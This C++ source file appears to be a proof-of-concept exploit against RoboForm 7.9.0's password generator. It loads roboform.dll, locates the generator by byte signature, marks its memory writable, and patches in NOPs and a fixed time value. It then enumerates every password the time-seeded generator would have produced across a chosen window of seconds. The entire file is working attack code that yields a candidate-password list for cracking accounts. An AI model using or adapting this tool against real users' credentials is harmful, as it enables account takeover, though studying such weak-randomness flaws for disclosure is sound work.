//
// RoboFormWrapper.cpp : This file contains the 'main' function. Program execution begins and ends there.
// For use with RoboForm 7.9.0
// Compiled and tested w/ Microsoft Visual Studio 2022 version 17.7.6
// 
// Must be run as administrator in order to properly set time in Windows
// Ensure Windows does not automatically sync or update time while program is running
//

#include <stdio.h>
#include <time.h>
#include <Windows.h>
#include <psapi.h>
#include <iostream>
#include <conio.h>
#include <WinUser.h>
#include <wchar.h>
#include <signal.h>

// Define time range in seconds since Unix Epoch (January 1, 1970 UTC)
time_t PrecomputeStartTime = 1362124800;   // Fri Mar 01 2013 08:00:00 GMT +0000
time_t PrecomputeEndTime = 1366441200;   // Sat Apr 20 2013 07:00:00 GMT +0000

// Signature scanning to find desired function within the DLL
const char* signature = "\x55\x8B\xEC\x83\xE4\xF8\x6A\xFF\x68\xA2\x0E"; // Target signature (beginning of password generator)
const char* mask = "xxxxxxxxxxx"; // 'x' means match, '?' means ignore

bool SignatureMatches(const BYTE* pData, const char* szSignature, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++szSignature)
    {
        if (*szMask == 'x' && *pData != static_cast<BYTE>(*szSignature))
        {
            return false;
        }
    }
    return (*szMask) == NULL;
}

uintptr_t FindSignature(uintptr_t start, size_t size, const char* szSignature, const char* szMask)
{
    size_t sigLength = strlen(szMask);
    for (size_t i = 0; i < size - sigLength; ++i)
    {
        if (SignatureMatches(reinterpret_cast<const BYTE*>(start + i), szSignature, szMask))
        {
            return start + i;
        }
    }
    return NULL;
}

bool SetSystemTimeFromUnixTime(time_t unixTime)
{
    tm timeinfo;

    // Convert Unix time to tm structure
    errno_t err = gmtime_s(&timeinfo, &unixTime);

    // Check for error
    if (err)
    {
        std::cerr << "Failed to convert Unix time." << std::endl;
        return 1;
    }

    // Convert tm structure to SYSTEMTIME
    SYSTEMTIME st;
    st.wYear = timeinfo.tm_year + 1900;
    st.wMonth = timeinfo.tm_mon + 1;
    st.wDayOfWeek = timeinfo.tm_wday;
    st.wDay = timeinfo.tm_mday;
    st.wHour = timeinfo.tm_hour;
    st.wMinute = timeinfo.tm_min;
    st.wSecond = timeinfo.tm_sec;
    st.wMilliseconds = 0; // SYSTEMTIME does not have milliseconds from tm structure

    // Set system time (UTC)
    return SetSystemTime(&st) != 0;
}

void signalHandler(int signalNumber)
{
    if (signalNumber == SIGINT)
    {
        exit(0);  // Exit gracefully
    }
}


BOOL RemapMemoryAsReadWriteExecute(LPVOID existingMemory, SIZE_T existingSize) {
    DWORD oldProtect;
    return VirtualProtect(existingMemory, existingSize, PAGE_EXECUTE_READWRITE, &oldProtect);
}


void usage(char** argv)
{
    printf("%s [PrecomputeStartTime PrecomputeEndTime settings num_chars minimum_chars]\n", argv[0]);
    printf("Ex: %s 1325376000 1325376020 7 8 0\n", argv[0]);
}



int main(int argc, char** argv)
{
    int settings = 0xf /* A-Z, a-z, 0-9, use special chars */, num_chars = 20, minimum_chars = 1;
    int result[64];

    // Number of characters, four unknown constants, Unicode string array
    char special_chars[] = { 8, 0, 0, 0, 7, 0, 0, 0, 2, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, \
                            '!', 0, '@', 0, '#', 0, '$', 0, '%', 0, '^', 0, '&', 0, '*', 0, 0, 0, 0, 0 };

    // Set the Ctrl+C signal handler
    signal(SIGINT, signalHandler);


    if (argc > 1 && argc < 6)
    {
        printf("Invalid number of arguments, using defaults\n FYI Usage: ");
        usage(argv);

        
    }
    else if (argc >= 6)
    {
        //PrecomputeStartTime PrecomputeEndTime settings num_chars, minimum_chars]
        PrecomputeStartTime = atoi(argv[1]);
        PrecomputeEndTime = atoi(argv[2]);
        settings = atoi(argv[3]);
        num_chars = atoi(argv[4]);
        minimum_chars = atoi(argv[5]);
    }

    // Load the DLL
    HMODULE hModule = LoadLibrary(TEXT("roboform.dll"));
    if (!hModule)
    {
        std::cerr << "DLL not found." << std::endl;
        return 1;
    }

    MODULEINFO modInfo = { 0 };
    if (!GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(modInfo)))
    {
        std::cerr << "Could not get module information." << std::endl;
        return 1;
    }

    // Scan for signature of desired function within the DLL
    uintptr_t base = reinterpret_cast<uintptr_t>(modInfo.lpBaseOfDll);
    uintptr_t size = static_cast<uintptr_t>(modInfo.SizeOfImage);

    uintptr_t foundAddress = FindSignature(base, size, signature, mask);
    if (foundAddress)
    {
        std::cout << "Signature found at: " << std::hex << foundAddress << std::endl;
        // Now we can create a function pointer and call it...
    }
    else
    {
        std::cerr << "Signature not found." << std::endl;
        return 1;
    }

    // Configure and display parameters
    int* doubleResult = result;

    int special[2];
    special[0] = ((int)(int*)special_chars) + 20;  // Point to the special characters string within the array
    special[1] = settings;

    printf("Number of characters: %d\n", num_chars);
    printf("Minimal number of digits: %d\n", minimum_chars);
    printf("Exclude similar characters: ");
    if (settings & 0x20) printf("Y"); else printf("N");
    printf("\nA-Z: ");
    if (settings & 0x01) printf("Y"); else printf("N");
    printf("\na-z: ");
    if (settings & 0x02) printf("Y"); else printf("N");
    printf("\n0-9: ");
    if (settings & 0x04) printf("Y"); else printf("N");
    printf("\nUse special characters: ");
    if (settings & 0x08) wprintf(L"%ls\n", (wchar_t*)special[0]); else printf("None\n");

    char dateTime[64];
    printf("Start time:\t%lld\t", (long long)PrecomputeStartTime);
    errno_t err = ctime_s(dateTime, sizeof(dateTime), &PrecomputeStartTime);
    if (err)
    {
        std::cerr << "Error converting start time." << std::endl;
        return 1;
    }
    std::cout << dateTime;

    printf("End time:\t%lld\t", (long long)PrecomputeEndTime);
    err = ctime_s(dateTime, sizeof(dateTime), &PrecomputeEndTime);
    if (err)
    {
        std::cerr << "Error converting end time." << std::endl;
        return 1;
    }
    std::cout << dateTime;

    std::cout << "Total passwords to generate: " << std::dec << (PrecomputeEndTime - PrecomputeStartTime) << std::endl;

    printf("\nYOU'RE ABOUT TO HACK TIME, ARE YOU SURE?\n\n");  // https://www.youtube.com/watch?v=fQGbXmkSArs



    RemapMemoryAsReadWriteExecute((LPVOID) (foundAddress & 0xFFFFF000), 0x2000); // rounding on a page just in case 

    /*
    * 
    * push    edi             ; Time
        mov     esi, ecx
        mov     [esp+460h+special_chars_], eax
        mov     [esp+460h+var_428], edi
        call    __time64                               // foundAddress+ 0x57 ( 5 bytes)
        sub     eax, g_seed_extra
        mov     [esp+460h+var_42C], edx
        push    eax             ; Seed
        call    _srand
        mov     eax, [esi+4]
        sub     g_seed_extra, 0E3A78h                  // foundAddress + 0x6f  (0xa bytes)
    
    */


    memset((void*) (foundAddress + 0x6f), '\x90', 0xa); // replace  "sub     g_seed_extra, 0E3A78"  with nops  (Allows to run the function multiple times without having to reload) 


    auto start_time =  _time64(0);
    

    // Loop to generate passwords for the given time frame
    for (time_t time_cnt = PrecomputeStartTime; time_cnt <= PrecomputeEndTime; ++time_cnt)
    {
        // Unload and reload the DLL to re-initialize
        /*FreeLibrary(hModule);
        HMODULE hModule = LoadLibrary(TEXT("C:\\Program Files (x86)\\Siber Systems\\AI RoboForm\\roboform.dll"));*/

        special[0] = ((int)(int*)special_chars) + 20;  // Reset pointer to the special characters string within the array

        // Set current time in seconds since Unix Epoch (January 1, 1970 UTC)
        /*/if (SetSystemTimeFromUnixTime(time_cnt) == 0)
        {
            std::cerr << "Failed to set system time." << std::endl;
            return 1;
        }*/


        //time_cnt = 1234;

        //replace call time64() by mov eax, time_cnt;  
        *(char*)((unsigned int)foundAddress + 0x57) = '\xb8';
        *(DWORD*)((unsigned int )foundAddress + 0x58) = time_cnt;

        __asm
        {
            mov         ebx, [minimum_chars]
            push        ebx
            sub         ebx, 1
            mov         eax, [num_chars]
            push        eax
            lea         ecx, dword ptr[special]
            push        ecx

            call        dword ptr[foundAddress]         // Call the actual password generator function
            mov         dword ptr[doubleResult], eax    // Move the generated password into our variable
        }

        // Output the result
        printf("%lld ", time_cnt);
        wprintf(L"%ls\n", (wchar_t*)doubleResult[0]);
    }

    // Free the DLL
    FreeLibrary(hModule);


    auto end_time = _time64(0);

    printf("Elapsed time: %lld\n", end_time - start_time);

    // Hack the planet!
    return 0;
}